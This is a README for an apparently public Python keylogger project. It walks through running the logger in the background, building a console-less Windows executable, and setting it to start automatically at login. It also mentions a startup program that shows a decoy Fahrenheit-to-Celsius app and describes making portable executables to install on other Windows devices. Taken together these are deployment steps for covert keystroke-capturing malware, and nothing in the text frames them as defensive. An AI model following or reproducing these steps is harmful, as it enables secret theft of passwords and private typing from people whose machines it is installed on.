# Python keylogger

The simplest keylogger you can create using Python 3 with only `keyboard` dependency

Note: Will delete logs file everytime it runs and only one instance is allowed to run at once

## Download and setup environment

```shell
git clone https://github.com/LuisEnMarroquin/python-keylogger.git
cd python-keylogger/
pip install -r requirements.txt
```

## Run as foreground process

```shell
python klog.py
```

## Run as background process

```shell
# Windows
pythonw klog.py

# Linux / macOS
python klog.py &
```

## Stop key logging

You can stop the background process at any time by clicking `f7` on any place, this is the easy way

The hard way is to search the process in your **Task Manager** and kill the process manually

## Linter

If you have `sh` installed you can lint all `.py` files at once by running

```shell
sh lint.sh
```

## Create Windows executable

If the following fails you may need to update all your global dependencies

```shell
pip install pyinstaller
pyinstaller --noconsole --onefile klog.py
```

## Run at startup on Windows

If `startup.py` gets any argument will open **Windows File Manager** otherwise will open a **Fahrenheit to Celsius** mock app

```shell
python startup.py
```

To remove auto startup remove keylogger related files at:
`C:\Users\USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\`

## Create portable executables to install on other Windows devices

```powershell
start startup.bat
```

This will generate 2 files at `dist/` folder:

* klog.exe (This is the actual keylogger that does all the work)
* startup.exe (This will setup the keylogger to auto-start with Windows, **requires klog.exe**)
